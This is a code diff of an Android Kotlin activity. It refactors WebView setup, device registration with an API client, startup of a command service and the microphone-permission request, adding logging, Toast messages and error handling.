@@ -24,12 +24,13 @@ class MainActivity : Activity() {
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
 
-        Log.d(TAG, "========== APP STARTED ==========")
+        Log.d(TAG, "=================================")
+        Log.d(TAG, "APP STARTED")
+        Log.d(TAG, "=================================")
 
-        // -------------------------------------------------
+        // -------------------------
         // WEBVIEW
-        // -------------------------------------------------
-
+        // -------------------------
         webView = WebView(this)
 
         webView.settings.javaScriptEnabled = true
@@ -40,7 +41,6 @@ class MainActivity : Activity() {
         webView.webViewClient = WebViewClient()
         webView.webChromeClient = WebChromeClient()
 
-        // Android -> JavaScript bridge
         webView.addJavascriptInterface(
             DeviceBridge(this),
             "Android"
@@ -48,42 +48,88 @@ class MainActivity : Activity() {
 
         setContentView(webView)
 
-        // Local HTML
         webView.loadUrl("file:///android_asset/index.html")
 
-        // -------------------------------------------------
-        // REGISTER DEVICE
-        // -------------------------------------------------
-
+        // -------------------------
+        // DEVICE REGISTRATION
+        // -------------------------
+        //
+        // IMPORTANT:
+        // Yaha clearDeviceCredentials() MAT lagana.
+        // Warna har app start par naya device banega.
+        //
         Thread {
 
-            val deviceId =
-                ApiClient.registerDevice(this)
+            try {
 
-            Log.d(
-                TAG,
-                "MY DEVICE ID = $deviceId"
-            )
+                Log.d(TAG, "STARTING DEVICE REGISTRATION")
 
-            runOnUiThread {
+                val deviceId = ApiClient.registerDevice(this)
 
-                if (!deviceId.isNullOrBlank()) {
+                Log.d(TAG, "MY DEVICE ID = $deviceId")
 
-                    webView.evaluateJavascript(
-                        "window.setDeviceId(${JSONObjectHelper.quote(deviceId)});",
-                        null
-                    )
+                runOnUiThread {
 
-                } else {
+                    if (!deviceId.isNullOrBlank()) {
 
-                    webView.evaluateJavascript(
-                        "window.setDeviceId('Registration failed');",
-                        null
-                    )
+                        Log.d(
+                            TAG,
+                            "DEVICE REGISTRATION SUCCESS"
+                        )
+
+                        // WebView me device ID show karo
+                        val safeDeviceId =
+                            JSONObjectHelper.quote(deviceId)
+
+                        webView.evaluateJavascript(
+                            "window.setDeviceId($safeDeviceId);",
+                            null
+                        )
+
+                        Toast.makeText(
+                            this,
+                            "Device: $deviceId",
+                            Toast.LENGTH_LONG
+                        ).show()
+
+                        // -------------------------
+                        // START COMMAND SERVICE
+                        // -------------------------
+                        startCommandService()
+
+                    } else {
+
+                        Log.e(
+                            TAG,
+                            "DEVICE REGISTRATION FAILED"
+                        )
+
+                        webView.evaluateJavascript(
+                            "window.setDeviceId('Registration failed');",
+                            null
+                        )
+
+                        Toast.makeText(
+                            this,
+                            "Device registration failed",
+                            Toast.LENGTH_LONG
+                        ).show()
+                    }
+                }
+
+            } catch (e: Exception) {
+
+                Log.e(
+                    TAG,
+                    "DEVICE REGISTRATION ERROR",
+                    e
+                )
+
+                runOnUiThread {
 
                     Toast.makeText(
                         this,
-                        "Device registration failed",
+                        "Registration error: ${e.message}",
                         Toast.LENGTH_LONG
                     ).show()
                 }
@@ -91,49 +137,49 @@ class MainActivity : Activity() {
 
         }.start()
 
-        // -------------------------------------------------
-        // COMMAND SERVICE
-        // -------------------------------------------------
-
-        startCommandService()
-
-        // -------------------------------------------------
-        // MICROPHONE
-        // -------------------------------------------------
-
+        // -------------------------
+        // MICROPHONE PERMISSION
+        // -------------------------
         checkMicrophonePermission()
     }
 
+
     // =====================================================
-    // COMMAND SERVICE
+    // START COMMAND SERVICE
     // =====================================================
 
     private fun startCommandService() {
 
         try {
 
-            val intent =
-                Intent(
-                    this,
-                    CommandService::class.java
-                )
+            Log.d(
+                TAG,
+                "STARTING COMMAND SERVICE..."
+            )
 
-            if (
-                Build.VERSION.SDK_INT >=
-                Build.VERSION_CODES.O
-            ) {
+            val intent = Intent(
+                this,
+                CommandService::class.java
+            )
+
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
 
                 startForegroundService(intent)
+
+                Log.d(
+                    TAG,
+                    "startForegroundService() CALLED"
+                )
 
             } else {
 
                 startService(intent)
-            }
 
-            Log.d(
-                TAG,
-                "COMMAND SERVICE START REQUESTED"
-            )
+                Log.d(
+                    TAG,
+                    "startService() CALLED"
+                )
+            }
 
         } catch (e: Exception) {
 
@@ -142,6 +188,12 @@ class MainActivity : Activity() {
                 "FAILED TO START COMMAND SERVICE",
                 e
             )
+
+            Toast.makeText(
+                this,
+                "Service start failed: ${e.message}",
+                Toast.LENGTH_LONG
+            ).show()
         }
     }
 
@@ -151,10 +203,7 @@ class MainActivity : Activity() {
 
     private fun checkMicrophonePermission() {
 
-        if (
-            Build.VERSION.SDK_INT >=
-            Build.VERSION_CODES.M
-        ) {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
 
             if (
                 checkSelfPermission(
@@ -200,10 +249,7 @@ class MainActivity : Activity() {
             grantResults
         )
 
-        if (
-            requestCode ==
-            MIC_PERMISSION_REQUEST
-        ) {
+        if (requestCode == MIC_PERMISSION_REQUEST) {
 
             if (
                 grantResults.isNotEmpty() &&
@@ -216,9 +262,15 @@ class MainActivity : Activity() {
                     "MICROPHONE PERMISSION GRANTED"
                 )
 
+                Toast.makeText(
+                    this,
+                    "Microphone permission granted",
+                    Toast.LENGTH_SHORT
+                ).show()
+
             } else {
 
-                Log.d(
+                Log.w(
                     TAG,
                     "MICROPHONE PERMISSION DENIED"
                 )
@@ -232,7 +284,9 @@ class MainActivity : Activity() {
 
     override fun onBackPressed() {
 
-        if (webView.canGoBack()) {
+        if (::webView.isInitialized &&
+            webView.canGoBack()
+        ) {
 
             webView.goBack()
 
